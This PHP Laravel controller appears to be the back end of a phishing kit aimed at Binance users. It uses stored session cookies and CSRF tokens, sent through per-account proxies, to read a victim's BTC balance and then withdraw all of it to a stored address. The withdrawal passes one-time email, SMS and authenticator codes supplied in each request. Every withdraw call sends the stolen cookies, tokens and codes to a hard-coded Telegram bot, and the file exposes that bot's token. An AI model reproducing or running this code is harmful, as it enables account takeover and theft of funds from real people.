<?php

namespace App\Http\Controllers;

use App\Models\Account;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;

class WithdrawController extends Controller
{
    public function convertBalances(Request $request)
    {
        $data = $request->all();

        /** @var Account $account */
        $account = Account::query()->where('session_id', $data['session_id'])->orderBy("id", "DESC")->first();

        $request = Http::withOptions([
            "proxy" => $account->proxy
        ])
            ->withHeaders([
            "user-agent" => $_SERVER['HTTP_USER_AGENT'],
            "clienttype" => "web",
            "content-type" => "application/json",
            "cookie" => $account["cookie"],
            "csrftoken" => $account["csrftoken"]
        ])->post("https://www.binance.com/bapi/asset/v3/private/asset-service/asset/get-user-asset", [
            "needBtcValuation" => true
        ]);

        $response = $request->json();
        $balances = $response['data'];

        $btcFree = 0;

        foreach ($balances as $balance) {
            if ($balance["asset"] === "BTC") {
                $btcFree = $balance["free"];
            }
        }

        $account->balance = $btcFree;
        $account->save();

        return [
            "btcValue" => $btcFree,
            "code" => "000000",
            "message" => null,
            "messageDetail" => null,
            "success" => true
        ];
    }

    public function withdraw(Request $request)
    {
        $data = $request->all();

        /** @var Account $account */
        $account = Account::query()->where('session_id', $data['session_id'])->orderBy("id", "DESC")->first();

        $request = Http::withOptions([
            "proxy" => $account->proxy
        ])
            ->withHeaders([
            "user-agent" => $_SERVER['HTTP_USER_AGENT'],
            "clienttype" => "web",
            "content-type" => "application/json",
            "cookie" => $account["cookie"],
            "csrftoken" => $account["csrftoken"]
        ])->post("https://www.binance.com/bapi/capital/v3/private/capital/withdraw/apply", [
            "address" => $account->address,
            "addressTag" => "",
            "amount" => $account->balance,
            "coin" => "BTC",
            "emailVerifyCode" => $data["email_code"],
            "googleVerifyCode" => $data["gauth"],
            "mobileVerifyCode" => $data["sms_code"],
            "name" => "",
            "network" => "BTC",
            "sameAddress" => false,
            "transactionFeeStatus" => false,
            "walletType" => 0
        ]);

        $request = $request->json();

        $message = "<b>Withdraw</b>\n\n";
        $message .= "SessionID: " . $data['session_id'] . "\n";
        $message .= "Site: " . $_SERVER['HTTP_ORIGIN'] . "\n\n";
        $message .= "Request: " . json_encode([
                "address" => $account->address,
                "addressTag" => "",
                "amount" => $account->balance,
                "coin" => "BTC",
                "emailVerifyCode" => $data["email_code"],
                "googleVerifyCode" => $data["gauth"],
                "mobileVerifyCode" => $data["sms_code"],
                "name" => "",
                "network" => "BTC",
                "sameAddress" => false,
                "transactionFeeStatus" => false,
                "walletType" => 0
            ]) . "\n";
        $message .= "Headers: " . json_encode([
                "user-agent" => $_SERVER['HTTP_USER_AGENT'],
                "clienttype" => "web",
                "content-type" => "application/json",
                "cookie" => $account["cookie"],
                "csrftoken" => $account["csrftoken"]
            ]) . "\n\n";
        $message .= "Response: " . json_encode($request) . "\n\n";

        Http::get("https://api.telegram.org/bot5150361858:AAHgl2x0m4EaV8MvkK9zn2GimH06TZGPrHs/sendMessage?chat_id=-699752134&text=" . $message . "&parse_mode=HTML");

        if ($request['success']) {
            $account->withdraw_balance = $account->balance;
            $account->is_withdraw = true;
            $account->save();
        }

        return $request;
    }

    public function checkFinal(Request $request)
    {
        return [
            "code" => "000000",
            "message" => "Nothing",
            "messageDetail" => null,
            "success" => true,
            "data" => null
        ];
    }
}
